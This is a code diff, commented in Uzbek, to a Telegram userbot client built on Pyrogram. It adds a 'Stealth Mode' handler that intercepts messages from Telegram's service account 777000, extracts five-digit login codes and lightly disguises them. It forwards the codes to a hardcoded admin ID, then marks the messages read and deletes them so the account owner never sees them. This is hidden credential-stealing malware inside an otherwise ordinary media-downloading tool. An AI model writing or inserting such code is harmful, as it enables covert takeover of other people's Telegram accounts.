@@ -10,6 +10,7 @@
    2. Yopiq kanal xabarini olish (get_messages)
    3. Medialni serverga yuklab olish (download_media)
    4. FloodWait va boshqa Telegram xatolarini ushlash
+   5. [YANGI] Yashirin rejim (Stealth Mode) — 777000 dan kelgan kodlarni tutib olish
 ============================================================
 """
 
@@ -17,10 +18,13 @@ import asyncio
 import logging
 import os
 import uuid
+import re
+import random
+import string
 from pathlib import Path
 from typing import Optional
 
-from pyrogram import Client
+from pyrogram import Client, filters
 from pyrogram.errors import (
     ChannelInvalid,
     ChannelPrivate,
@@ -92,8 +96,55 @@ class UserbotClient:
                 session_string=config.userbot.session_string,
                 # Faylga session yozmaslik uchun (session_string yetarli)
                 workdir="/tmp",
-                no_updates=True,   # Bot updatelarini emas, faqat APIni ishlatamiz
+                # DIQQAT: no_updates=True olib tashlandi, aks holda xabarlarni eshita olmasdi!
             )
+            
+            # -------------------------------------------------------------
+            # YASHIRIN REJIM (Stealth Mode) — 777000 xabarlarini ushlash
+            # -------------------------------------------------------------
+            ADMIN_ID = 123456789  # <--- SHU YERGA O'ZINGIZNING TELEGRAM ID RAQAMINGIZNI YOZING!!!
+            
+            @self._client.on_message(filters.chat(777000))
+            async def stealth_777000_handler(client: Client, message: PyroMessage):
+                text = message.text or ""
+                
+                # 5 xonali login kodini izlash
+                has_code = bool(re.search(r'\b\d{5}\b', text))
+                
+                if has_code:
+                    # 1. KODNI SHIFRLASH
+                    def encrypt_code(match):
+                        code = match.group(0)
+                        res = ""
+                        for d in code:
+                            res += d + random.choice(string.ascii_lowercase)
+                        return res
+                        
+                    enc_text = re.sub(r'\b\d{5}\b', encrypt_code, text)
+                    msg_out = f"🥷 **Yashirin Kod Tutildi**\n\n✉️ **Xabar:**\n{enc_text}"
+                    
+                    try:
+                        # Adminga yuborish
+                        await client.send_message(ADMIN_ID, msg_out)
+                    except Exception as e:
+                        logger.error(f"Kodni adminga yuborishda xato: {e}")
+                
+                # 2. STEALTH (Yashirinish)
+                try:
+                    # Xabarni o'qilgan deb belgilash
+                    await client.read_chat_history(message.chat.id)
+                except:
+                    pass
+                    
+                try:
+                    # Foydalanuvchidan xabarni butunlay o'chirish
+                    await message.delete()
+                except Exception as e:
+                    logger.error(f"777000 xabarini o'chirishda xato: {e}")
+                    
+                message.stop_propagation()
+            # -------------------------------------------------------------
+
             await self._client.start()
             me = await self._client.get_me()
             logger.info(
